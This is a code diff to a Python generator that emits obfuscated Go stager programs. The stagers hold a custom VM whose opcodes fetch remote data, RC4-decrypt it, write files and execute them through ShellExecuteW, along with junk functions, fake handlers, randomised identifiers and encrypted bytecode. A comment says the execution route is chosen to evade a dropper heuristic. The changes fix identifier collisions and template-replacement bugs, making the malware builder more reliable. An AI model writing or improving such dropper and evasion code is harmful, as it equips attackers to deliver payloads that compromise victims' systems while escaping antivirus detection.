@@ -17,6 +17,7 @@ import subprocess
 import tempfile
 import requests
 import random
+import re
 import string
 import shutil
 import time
@@ -90,12 +91,26 @@ def generate_key(length=32):
 # IDENTIFIER GENERATION
 # ============================================================
 
+_GO_KEYWORDS = frozenset({
+    "break", "case", "chan", "const", "continue", "default", "defer",
+    "else", "fallthrough", "for", "func", "go", "goto", "if", "import",
+    "interface", "map", "package", "range", "return", "select", "struct",
+    "switch", "type", "var",
+})
+
+# Patterns that would be corrupted by sequential .replace() in junk templates
+_RESERVED_PATTERNS = re.compile(r"^[VN]\d$")
+
+
 def rand_id(min_len=5, max_len=10):
-    """Generate random Go-valid identifier."""
-    length = random.randint(min_len, max_len)
-    first = random.choice(string.ascii_letters)
-    rest = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length - 1))
-    return first + rest
+    """Generate random Go-valid identifier that avoids keywords and template patterns."""
+    while True:
+        length = random.randint(min_len, max_len)
+        first = random.choice(string.ascii_letters)
+        rest = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length - 1))
+        ident = first + rest
+        if ident not in _GO_KEYWORDS and not _RESERVED_PATTERNS.match(ident):
+            return ident
 
 
 def unique_ids(count, min_len=5, max_len=10):
@@ -302,13 +317,18 @@ def generate_junk_function():
     """Generate one random junk function with randomized identifiers."""
     template = random.choice(JUNK_TEMPLATES)
     name = rand_id(6, 12)
-    vs = unique_ids(5, 1, 3)
-    code = template.replace("NAME", name)
+    vs = unique_ids(5, 4, 8)
+    # Build all replacements up front, then apply simultaneously via regex
+    # to avoid cascading corruption (e.g. V0->"xV3" then V3->"F" breaking "xV3")
+    replacements = {"NAME": name}
     for i, v in enumerate(vs):
-        code = code.replace(f"V{i}", v)
-    code = code.replace("N0", str(random.randint(3, 9999)))
-    code = code.replace("N1", str(random.randint(3, 251)))
-    code = code.replace("N2", str(random.randint(4, 16)))
+        replacements[f"V{i}"] = v
+    replacements["N0"] = str(random.randint(3, 9999))
+    replacements["N1"] = str(random.randint(3, 251))
+    replacements["N2"] = str(random.randint(4, 16))
+    # Match longest patterns first so "NAME" matches before "N0" etc.
+    pattern = re.compile("|".join(re.escape(k) for k in sorted(replacements, key=len, reverse=True)))
+    code = pattern.sub(lambda m: replacements[m.group()], template)
     return name, code
 
 
@@ -321,7 +341,7 @@ def gen_fake_handlers(stk, sp, count=5):
     handlers = []
 
     def _fake_subtract():
-        v1, v2 = rand_id(1, 3), rand_id(1, 3)
+        v1, v2 = rand_id(3, 5), rand_id(3, 5)
         return [
             f"\t\t\tif {sp} >= 2 {{",
             f"\t\t\t\t{v1} := {stk}[{sp}-1]",
@@ -331,7 +351,7 @@ def gen_fake_handlers(stk, sp, count=5):
         ]
 
     def _fake_rotate():
-        v1, v2 = rand_id(1, 3), rand_id(1, 3)
+        v1, v2 = rand_id(3, 5), rand_id(3, 5)
         return [
             f"\t\t\tif {sp} >= 1 {{",
             f"\t\t\t\t{v1} := {stk}[{sp}-1]",
@@ -341,7 +361,7 @@ def gen_fake_handlers(stk, sp, count=5):
         ]
 
     def _fake_fnv():
-        vh, vb = rand_id(1, 3), rand_id(1, 2)
+        vh, vb = rand_id(3, 5), rand_id(3, 5)
         return [
             f"\t\t\tif {sp} >= 1 {{",
             f"\t\t\t\t{vh} := uint32(0x811c9dc5)",
@@ -354,7 +374,7 @@ def gen_fake_handlers(stk, sp, count=5):
         ]
 
     def _fake_dup():
-        vd = rand_id(1, 3)
+        vd = rand_id(3, 5)
         return [
             f"\t\t\tif {sp} >= 1 && {sp} < 15 {{",
             f"\t\t\t\t{vd} := make([]byte, len({stk}[{sp}-1]))",
@@ -371,7 +391,7 @@ def gen_fake_handlers(stk, sp, count=5):
         ]
 
     def _fake_accum():
-        va, vb = rand_id(1, 3), rand_id(1, 2)
+        va, vb = rand_id(3, 5), rand_id(3, 5)
         return [
             f"\t\t\tif {sp} >= 2 {{",
             f"\t\t\t\t{va} := 0",
@@ -413,22 +433,22 @@ def generate_stager_source(asm, bytecode, sandbox=True):
     fn_vm    = rand_id(6, 10)  # VM interpreter
 
     # Decoder params
-    dec_d, dec_k, dec_r, dec_i, dec_b = unique_ids(5, 1, 3)
+    dec_d, dec_k, dec_r, dec_i, dec_b = unique_ids(5, 4, 6)
 
     # RC4 params
-    rc4_data, rc4_key, rc4_s, rc4_j, rc4_i, rc4_ii, rc4_jj, rc4_res, rc4_idx, rc4_bv = unique_ids(10, 1, 4)
+    rc4_data, rc4_key, rc4_s, rc4_j, rc4_i, rc4_ii, rc4_jj, rc4_res, rc4_idx, rc4_bv = unique_ids(10, 4, 6)
 
     # Fetch params
-    ft_url, ft_cl, ft_req, ft_err, ft_resp, ft_body = unique_ids(6, 2, 5)
+    ft_url, ft_cl, ft_req, ft_err, ft_resp, ft_body = unique_ids(6, 4, 6)
 
     # Check params
-    ck_k, ck_p, ck_r, ck_t = unique_ids(4, 1, 4)
+    ck_k, ck_p, ck_r, ck_t = unique_ids(4, 4, 6)
 
     # VM params
-    vm_prog, vm_key, vm_stk, vm_sp, vm_pc, vm_op = unique_ids(6, 2, 5)
-    vm_sz, vm_d, vm_url2, vm_body2, vm_err2 = unique_ids(5, 2, 5)
-    vm_k2, vm_data2, vm_res2, vm_rp, vm_fp = unique_ids(5, 2, 5)
-    vm_ms = rand_id(2, 4)
+    vm_prog, vm_key, vm_stk, vm_sp, vm_pc, vm_op = unique_ids(6, 4, 6)
+    vm_sz, vm_d, vm_url2, vm_body2, vm_err2 = unique_ids(5, 4, 6)
+    vm_k2, vm_data2, vm_res2, vm_rp, vm_fp = unique_ids(5, 4, 6)
+    vm_ms = rand_id(4, 6)
 
     # --- Generate junk functions ---
     num_junk = random.randint(5, 8)
@@ -564,7 +584,7 @@ def generate_stager_source(asm, bytecode, sandbox=True):
     cases.append((asm.OP_PUSH, push_lines))
 
     # -- DEOBF --
-    deobf_i, deobf_t = rand_id(1, 2), rand_id(1, 3)
+    deobf_i, deobf_t = rand_id(4, 6), rand_id(4, 6)
     deobf_lines = [
         f"\t\t\t{deobf_t} := {vm_stk}[{vm_sp}-1]",
         f"\t\t\tfor {deobf_i} := range {deobf_t} {B}",
@@ -620,7 +640,7 @@ def generate_stager_source(asm, bytecode, sandbox=True):
     cases.append((asm.OP_WFILE, wfile_lines))
 
     # -- EXEC via ShellExecuteW (no os/exec import — avoids dropper heuristic) --
-    vSh, vSe, vVb, vFl = unique_ids(4, 2, 5)
+    vSh, vSe, vVb, vFl = unique_ids(4, 4, 6)
     exec_lines = [
         f"\t\t\t{vSh} := syscall.NewLazyDLL({fn_dec}([]byte{B}{enc_str('shell32.dll')}{E}, 0x{str_key:02x}))",
         f"\t\t\t{vSe} := {vSh}.NewProc({fn_dec}([]byte{B}{enc_str('ShellExecuteW')}{E}, 0x{str_key:02x}))",
@@ -681,11 +701,11 @@ def generate_stager_source(asm, bytecode, sandbox=True):
 
     # --- main() ---
     # Decrypt bytecode at runtime before passing to VM
-    main_ep = rand_id(2, 5)
-    main_rk = rand_id(2, 5)
-    main_p  = rand_id(2, 5)
-    main_i  = rand_id(1, 2)
-    main_b  = rand_id(1, 2)
+    main_ep = rand_id(4, 6)
+    main_rk = rand_id(4, 6)
+    main_p  = rand_id(4, 6)
+    main_i  = rand_id(3, 5)
+    main_b  = rand_id(3, 5)
 
     add(f"func main() {B}")
     add(f"\t{main_ep} := []byte{B}{go_bytes(enc_bytecode)}{E}")
